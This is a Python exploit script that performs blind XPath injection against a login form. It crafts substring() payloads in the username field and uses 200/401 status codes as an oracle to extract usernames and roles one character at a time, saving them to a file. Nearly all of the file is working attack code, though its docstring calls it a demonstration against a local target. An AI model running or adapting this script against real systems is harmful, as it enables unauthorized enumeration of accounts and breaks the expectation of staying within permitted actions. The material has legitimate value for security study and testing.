"""
blind_xpath_exploit.py

Performs blind XPath injection against a vulnerable login endpoint.

This script targets applications that construct XPath queries unsafely using
user-supplied input from the 'username' field. It uses crafted injection payloads
to extract usernames of users with role='admin', one character at a time.

The server’s HTTP response code (200 for success, 401 for failure) is used as a boolean
oracle to infer the correctness of each guessed character. The attack proceeds by
iterating over admin user indexes and performing character-by-character guessing
using XPath functions like substring().

This tool is designed to demonstrate inference-based exploitation of XML-backed
authentication mechanisms.

Usage:
    python3 blind_xpath_exploit.py --target http://127.0.0.1:5000
"""

import argparse
import string
import requests
import sys
import time



def get_characters():

    visible_charset = string.digits + string.ascii_letters + string.punctuation

    return visible_charset


def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Performs blind XPath injection against a vulnerable login endpoint.\n"
            "Uses crafted payloads in the 'username' field to infer usernames of users\n"
            "with role='admin' by observing HTTP status codes (200/401) as a boolean oracle."
        )
    )

    parser.add_argument(
        "--target",
        required=True,
        help="Base URL of the target (e.g. http://127.0.0.1:5000)"
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Optional delay (in seconds) between requests"
    )

    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose output of each request and response"
    )

    parser.add_argument(
        "--output",
        type=str,
        default="discovered_admins.txt",
        help="File to write discovered usernames and roles"
    )

    parser.add_argument(
        "--proxy",
        help="Proxy to use for HTTP requests (e.g. http://127.0.0.1:8080)"
    )

    parser.add_argument(
        "--extract",
        choices=["users"],
        required=True,
        help="Type of data to extract: users with roles."
    )

    parser.add_argument(
        "--max-guess",
        type=int,
        default=10,
        help="Maximum guesses for the number of users."
    )

    return parser.parse_args()


def search_users_and_role(max_guess, target, delay, proxy=None):
    """
    Only extract `username`s of users where `role='admin'`
    XPath query: username = ' or substring(//user[1]/username/text(), 1, 1) = 'c' or '
    """

    users = {}

    for index in range(1, max_guess):
        name = find_user(index, target, delay, proxy)
        if name:
            role = find_role(index, target, delay, proxy)
            users[name] = role
        else:
            break

    return users    


def find_user(index, target, delay, proxy=None):

    char_set = get_characters()

    username = ''
    i = 1
    while True:
        found_character = False

        for char in char_set:
            xpath_query = build_payload(index, i, char,"username")
            status = test_char(xpath_query, target, proxy)
            if delay:
                time.sleep(delay)
            if status == 200:  
                username += char
                print_progress("[+] Matched: ", username)
                i += 1
                found_character = True
                break
            else:
                continue

        if not found_character:
            if username:
                print_final("[+] Final username", username)
                return username
            else:
                print(f"[-] No match at index {index}")
                break

    return None

def find_role(index, target, delay, proxy=None):

    char_set = get_characters()

    role = ''
    i = 1
    while True:
        found_character = False

        for char in char_set:
            xpath_query = build_payload(index, i, char,"role")
            if delay:
                time.sleep(delay)
            status = test_char(xpath_query, target, proxy)
            if status == 200:  
                role += char
                print_progress("[+] Matched: ", role)
                i += 1
                found_character = True
                break
            else:
                continue

        if not found_character:
            if role:
                print_final("Final role", role)
                return role
            else:
                print(f"[-] No match at index {index}")
                break

    return None


def build_payload(index, pos, char, field="username"):
    return f"' or substring(//user[{index}]/{field}/text(), {pos}, 1) = '{char}' or '"


def test_char(query_string, target, proxy=None):

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = f"username={query_string}&password=x"
    proxies = None
    if proxy:
        proxies = {
            'http' : proxy,
            'https' : proxy
        }
    response = requests.post(target, data=data, headers=headers, proxies=proxies,  verify=False)
    return response.status_code


def print_progress(prefix, value):
    sys.stdout.write(f"\r\033[K{prefix}{value}")
    sys.stdout.flush()

def print_final(label, value):
    sys.stdout.write(f"\r\033[K[+] {label}: {value}\n")


def main():
    args = parse_args()

    if args.extract == "users":
        data = search_users_and_role(args.max_guess, args.target, args.delay, args.proxy)
    else:
        print("Missing choice.")
        sys.exit(0)

    if args.output:
        with open(args.output, 'w') as f:
            for key, value in data.items():
                f.write(f"{key} : {value}\n")


if __name__ == "__main__":
    main()
